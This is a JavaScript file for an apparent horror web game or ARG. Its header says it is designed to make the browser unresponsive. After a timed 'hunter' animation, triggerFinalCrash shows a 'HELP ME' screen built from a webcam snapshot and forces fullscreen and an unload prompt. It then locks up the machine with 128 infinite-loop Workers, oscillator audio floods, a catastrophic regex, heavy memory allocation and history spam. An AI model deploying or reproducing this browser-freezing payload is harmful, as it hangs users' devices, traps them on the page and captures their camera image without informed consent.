/* PROJECT: RYUGYONG-26 / GFBOT-G1NKO5A
   STATUS: ABSOLUTE ZERO (HARD FREEZE ENABLED)
   WARNING: This script is designed to make the browser unresponsive. 
   Use only in controlled educational/ARG environments.
*/

let posX = -1000, posY = -1000;
let isLightOn = false;
let audioStarted = false;
let systemCrashed = false;
let videoStream = null;
let mouseX = window.innerWidth / 2;
let mouseY = window.innerHeight / 2;

const map = document.getElementById('map');
const overlay = document.getElementById('flashlight-overlay');
const intro = document.getElementById('intro');

// 1. 攝像頭權限預備 (Soul Access)
async function setupCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        videoStream = stream;
    } catch (err) {
        console.log("Soul access denied - but the hunt continues.");
    }
}

// 2. 跨平台音頻啟動
function startCreepyVoice() {
    if (audioStarted) return;
    const AudioContext = window.AudioContext || window.webkitAudioContext;
    const audioCtx = new AudioContext();
    if (audioCtx.state === 'suspended') audioCtx.resume();

    const scriptNode = audioCtx.createScriptProcessor(4096, 1, 1);
    let t = 0;
    scriptNode.onaudioprocess = (e) => {
        const output = e.outputBuffer.getChannelData(0);
        for (let i = 0; i < output.length; i++) {
            if (systemCrashed) {
                output[i] = (Math.random() * 2 - 1) * 0.98; // 崩潰後的爆音
            } else {
                let g = (t & (t >> 8)) ? 0.08 : -0.08;
                output[i] = (Math.random() * 0.1) + g;
            }
            t++;
        }
    };
    scriptNode.connect(audioCtx.destination);
    audioStarted = true;
}

// 3. 自動獵殺：白色靈魂 (Auto-Homing Soul)
setTimeout(() => {
    if (systemCrashed) return;
    const glitchBlock = document.createElement('div');
    const side = Math.floor(Math.random() * 4);
    let startX, startY;
    if (side === 0) { startX = -100; startY = Math.random() * window.innerHeight; }
    else if (side === 1) { startX = window.innerWidth + 100; startY = Math.random() * window.innerHeight; }
    else if (side === 2) { startX = Math.random() * window.innerWidth; startY = -100; }
    else { startX = Math.random() * window.innerWidth; startY = window.innerHeight + 100; }

    glitchBlock.style.cssText = `position:fixed; width:40px; height:40px; background:white; z-index:10001; left:${startX}px; top:${startY}px; box-shadow:0 0 40px 10px white; transition:transform 0.05s linear; pointer-events:none;`;
    document.body.appendChild(glitchBlock);

    let currentX = startX, currentY = startY;
    const speed = 4.5; 

    const hunterInterval = setInterval(() => {
        if (systemCrashed) { clearInterval(hunterInterval); return; }
        const centerX = window.innerWidth / 2, centerY = window.innerHeight / 2;
        const dx = centerX - (currentX + 20), dy = centerY - (currentY + 20);
        const distance = Math.sqrt(dx * dx + dy * dy);

        if (distance < 35) {
            triggerFinalCrash();
            glitchBlock.remove();
            clearInterval(hunterInterval);
        } else {
            currentX += (dx / distance) * speed;
            currentY += (dy / distance) * speed;
            glitchBlock.style.left = `${currentX}px`;
            glitchBlock.style.top = `${currentY}px`;
            const scale = 1 + (250 / distance); 
            glitchBlock.style.transform = `scale(${scale})`;
        }
    }, 16);
}, 25000); // 25秒後開始獵殺

// 4. 攝像頭奪魂與扭曲 (Distortion)
function captureAndDistort() {
    if (!videoStream) return;
    const canvas = document.createElement('canvas');
    const video = document.createElement('video');
    video.srcObject = videoStream;
    video.play();

    setTimeout(() => {
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        const ctx = canvas.getContext('2d');
        ctx.filter = 'grayscale(100%) contrast(800%) brightness(30%)';
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        const dataUrl = canvas.toDataURL('image/jpeg');
        const ds = document.getElementById('death-screen');
        if (ds) {
            ds.style.backgroundImage = `url(${dataUrl})`;
            ds.style.backgroundSize = 'cover';
            ds.style.backgroundBlendMode = 'hard-light';
        }
        videoStream.getTracks().forEach(t => t.stop());
    }, 50);
}

// 5. 核心：絕對零度封鎖 (The Absolute Freeze)
function triggerFinalCrash() {
    if (systemCrashed) return;
    systemCrashed = true;

    // A. 顯示死機畫面 (HELP ME)
    document.body.innerHTML = `
        <div id="death-screen" style="background:black; color:red; width:100vw; height:100vh; display:flex; justify-content:center; align-items:center; position:fixed; top:0; left:0; z-index:9999999; cursor:none; overflow:hidden;">
            <h1 style="font-size:15vw; font-family:serif; text-shadow:0 0 50px red; margin:0;">HELP ME.</h1>
        </div>
    `;

    // B. 影相
    captureAndDistort();

    // C. 請求全屏
    const el = document.documentElement;
    if (el.requestFullscreen) el.requestFullscreen();
    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();

    window.onbeforeunload = () => "    .     ";

    // D. 執行死鎖
    setTimeout(() => {
        // 1. 音頻過載
        const ac = new (window.AudioContext || window.webkitAudioContext)();
        setInterval(() => {
            let o = ac.createOscillator();
            o.type = 'sawtooth'; o.frequency.value = Math.random() * 5000;
            o.connect(ac.destination); o.start();
        }, 20);

        // 2. 硬件壓力 (128 Workers)
        const b = new Blob([`while(true){postMessage(0)}`], {type:'text/javascript'});
        const u = URL.createObjectURL(b);
        for(let i=0; i<128; i++) new Worker(u);

        // 3. 邏輯死鎖：RegExp 炸彈 + 同步阻塞
        const vault = [];
        function lock() {
            const bomb = /^(a+)+$/;
            const target = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"; 
            target.match(bomb); // CPU 指數級運算 (同步阻塞)

            for(let i=0; i<100; i++) {
                vault.push(new BigUint64Array(1024 * 1024)); // 食 RAM
                window.history.pushState(null, null, "#" + Math.random());
            }

            const s = Date.now();
            while(Date.now() - s < 2000) { Math.atan2(Math.random(), 1); } // 強制同步鎖死 2 秒

            Promise.resolve().then(lock); // 微任務插隊
            setTimeout(lock, 0);
        }
        lock();
    }, 100);
}

// 6. 控制與觸摸
window.addEventListener('mousemove', (e) => {
    mouseX = e.clientX; mouseY = e.clientY;
    if (isLightOn && !systemCrashed) {
        overlay.style.background = `radial-gradient(circle 140px at ${mouseX}px ${mouseY}px, transparent 0%, rgba(0,0,0,0.99) 100%)`;
    }
});

window.addEventListener('touchstart', (e) => {
    if (!audioStarted) {
        setupCamera(); startCreepyVoice();
        intro.style.display = 'none';
        if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
    }
    if (!systemCrashed) posY += 40;
    map.style.transform = `translate(${posX}px, ${posY}px)`;
});

window.addEventListener('keydown', (e) => {
    if (systemCrashed) return;
    let k = e.key.toLowerCase();
    if (k === 'f') { 
        setupCamera(); startCreepyVoice();
        intro.style.display = 'none'; 
        if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
    }
    if (k === '1') {
        isLightOn = !isLightOn;
        overlay.style.background = isLightOn ? `radial-gradient(circle 140px at ${mouseX}px ${mouseY}px, transparent 0%, rgba(0,0,0,0.99) 100%)` : 'black';
    }
    const spd = 60;
    if (k === 'w') posY += spd; if (k === 's') posY -= spd;
    if (k === 'a') posX += spd; if (k === 'd') posX -= spd;
    map.style.transform = `translate(${posX}px, ${posY}px)`;
});
